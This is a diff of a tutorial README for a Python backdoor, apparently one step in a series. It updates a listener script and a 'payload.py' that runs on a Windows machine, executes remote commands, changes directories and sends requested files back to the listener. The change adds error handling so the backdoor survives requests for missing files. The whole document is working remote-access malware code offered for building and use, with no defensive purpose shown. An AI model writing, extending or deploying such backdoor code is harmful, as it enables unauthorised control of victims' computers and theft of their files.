@@ -1,27 +1,9 @@
-<h2 align="center">Download Functionality</h2>
+<h2 align="center">Handle Download Exceptions</h2>
 <p align="center"><img width="350" height="350" src="./src/banner_cnph.gif"></p>
 
-Pass download command with the name of file to download
+If you download a non-existing file, it would throw an error message and the backdoor will be terminated.
 
-command : `download message.txt`
-
-If the command is starting from zero index
-
-`cmd[0:`
-
-Slice into two parts, first part starts with `D`  in `download`</br>
-which will be at the zero index up to the exclusion position
-
-`cmd[0:8] -> download`
-
-You can start with initial index since the zero is optional
-
-`cmd[:8] -> download`
-
-The [8:9] index would be the whitespace inbetween the two slice</br>
-Second part starts with [9] index till last index
-
-`cmd[9:] -> message.txt`
+To handle the file not found exception rather than crashing and exiting the backddor 
 
 - - - - - - - - - - - - - - - - - - - - - -
 > [listener.py](listener.py)
@@ -60,18 +42,20 @@ while True:
 		recv = recv_data()
 		print(recv.decode("utf-8"))
 		continue
-	
-	# If it's a download command
+
 	elif cmd[:8] == "download":
-		# Give download command to the Windows machine by send information
 		connection.send(bytes(cmd, "utf-8"))
-		# Get data in the listener and create file to store the data
+
 		file_output = recv_data()
-		# Open and save data in write binary mode, set name as write_data
+		# If does not contain any data information
+		if file_output == b"No file found":
+			# Decode the message through server side in terms of byte
+			print(file_output.decode("utf-8"))
+			continue # Continue rather than terminating
+
 		with open(f'{cmd[9:]}', 'wb') as write_data:
-			# Use write function for the data information sent by client / windows machine
 			write_data.write(file_output)
-			write_data.close() # Close the file that have been written
+			write_data.close()
 		continue 
 		
 	connection.send(bytes(cmd, "utf-8"))
@@ -81,7 +65,7 @@ while True:
 
 print("Server has stopped")
 ```
----
+
 > [payload.py](payload.py)
 ```python
 import socket
@@ -111,21 +95,26 @@ while True:
 	
 	elif cmd[:2] == "cd":
 		try:
-			os.chdir(cmd[3:])
+			os.chdir(cmd[3:]) # cd Desktop -: Desktop
 		except FileNotFoundError:
 			send_data(b"File not found")
 		else:
 			send_data(b"Changed directory")
 		continue
 
-	# Need to catch if the command is download
-	elif cmd[:8] == "download": # Command sent to the client / windows machine
-		# Get the file to download which is message.txt
-		with open(f'{cmd[9:]}', 'rb') as data: # Open in read binary mode and set name as data
-			data_read = data.read() # Read the data using function and store in a variable
-			data.close() # Close after performing the operation
-		# Send read data back to the server machine
-		send_data(data_read)
+	# download message.txt
+	elif cmd[:8] == "download":
+		# Handle the exception with try/except block
+		try:
+			# Content to be inside the try block
+			with open(f'{cmd[9:]}', 'rb') as data:
+				data_read = data.read()
+				data.close()
+		# The error that will be caught whenever the file downloaded does not exist
+		except FileNotFoundError:
+			send_data(b"No file found") # Message will be sent in bytes to the server side
+		else: # If no exception then call the data
+			send_data(data_read)
 		continue
 
 	try:
@@ -137,5 +126,3 @@ while True:
 
 print("Disconnected") # display disconnection message
 ```
-
-**Note** : The `message.txt` that was downloaded can be found in the same directory as the [listener.py](listener.py) is located.
